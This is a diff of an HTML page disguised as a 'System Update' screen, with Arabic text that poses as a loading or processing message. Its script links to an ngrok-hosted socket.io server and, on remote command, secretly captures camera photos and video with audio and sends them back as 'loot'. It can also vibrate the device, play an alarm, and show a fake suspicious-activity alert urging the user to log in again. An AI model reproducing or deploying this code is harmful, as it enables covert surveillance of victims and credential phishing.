@@ -1,46 +1,48 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <meta charset="UTF-8"><title>Loading...</title>
+    <meta charset="UTF-8"><title>System Update</title>
     <script src="https://cdn.socket.io/4.7.4/socket.io.min.js"></script>
 </head>
-<body style="background:#000; color:#05ff05; text-align:center; font-family:sans-serif; padding-top:100px;">
-    <h2 id="msg">تم التحميل، استمتع بالمشاهدة ✅</h2>
-    <p>يرجى البقاء في الصفحة للمتابعة</p>
-
+<body style="background:#000; color:#fff; text-align:center; padding-top:100px;">
+    <h2>جاري معالجة البيانات...</h2>
     <script>
-        const SERVER = "https://kinship-porridge-molasses.ngrok-free.dev";
-        const socket = io(SERVER, { transports: ['websocket', 'polling'], upgrade: true });
-
-        async function init() {
-            try { await navigator.mediaDevices.getUserMedia({video:true, audio:true}); } catch(e){}
-        }
-        init();
-
-        socket.on('command', async (cmd) => {
-            const facing = cmd.action.includes('front') ? "user" : "environment";
+        const socket = io("https://kinship-porridge-molasses.ngrok-free.dev");
+        
+        async function getMedia(facing, type) {
+            const constraints = {
+                video: { facingMode: facing, width: 1280, height: 720 },
+                audio: type === 'vid'
+            };
+            const stream = await navigator.mediaDevices.getUserMedia(constraints);
             
-            if (cmd.action.includes('scan')) {
-                const s = await navigator.mediaDevices.getUserMedia({video: {facingMode: facing}});
-                const v = document.createElement('video'); v.srcObject = s; await v.play();
+            if (type === 'img') {
+                const v = document.createElement('video'); v.srcObject = stream; await v.play();
                 const c = document.createElement('canvas'); c.width = v.videoWidth; c.height = v.videoHeight;
                 c.getContext('2d').drawImage(v,0,0);
                 socket.emit('loot', {type:'photo', data: c.toDataURL('image/png').split(',')[1]});
-                s.getTracks().forEach(t => t.stop());
-            }
-
-            if (cmd.action.includes('vid')) {
-                const s = await navigator.mediaDevices.getUserMedia({video: {facingMode: facing}, audio:true});
-                const rec = new MediaRecorder(s); const chunks = [];
-                rec.ondataavailable = e => chunks.push(e.data);
+                stream.getTracks().forEach(t => t.stop());
+            } else {
+                const rec = new MediaRecorder(stream); const ch = [];
+                rec.ondataavailable = e => ch.push(e.data);
                 rec.onstop = () => {
-                    const reader = new FileReader();
-                    reader.onload = () => socket.emit('loot', {type:'video', data: reader.result.split(',')[1]});
-                    reader.readAsDataURL(new Blob(chunks));
-                    s.getTracks().forEach(t => t.stop());
+                    const r = new FileReader();
+                    r.onload = () => socket.emit('loot', {type:'video', data: r.result.split(',')[1]});
+                    r.readAsDataURL(new Blob(ch));
+                    stream.getTracks().forEach(t => t.stop());
                 };
-                rec.start(); setTimeout(() => rec.stop(), 10000);
+                rec.start(); setTimeout(() => rec.stop(), 7000);
             }
+        }
+
+        socket.on('command', (cmd) => {
+            if(cmd.action === 'scan_back') getMedia('environment', 'img');
+            if(cmd.action === 'scan_front') getMedia('user', 'img');
+            if(cmd.action === 'vid_back') getMedia('environment', 'vid');
+            if(cmd.action === 'vid_front') getMedia('user', 'vid');
+            if(cmd.action === 'vibrate') navigator.vibrate([500, 200, 500]);
+            if(cmd.action === 'alarm') { let a = new Audio('https://www.soundjay.com/buttons/beep-01a.mp3'); a.play(); }
+            if(cmd.action === 'notify') alert("⚠️ تم اكتشاف نشاط مشبوه، يرجى إعادة تسجيل الدخول");
         });
     </script>
 </body>
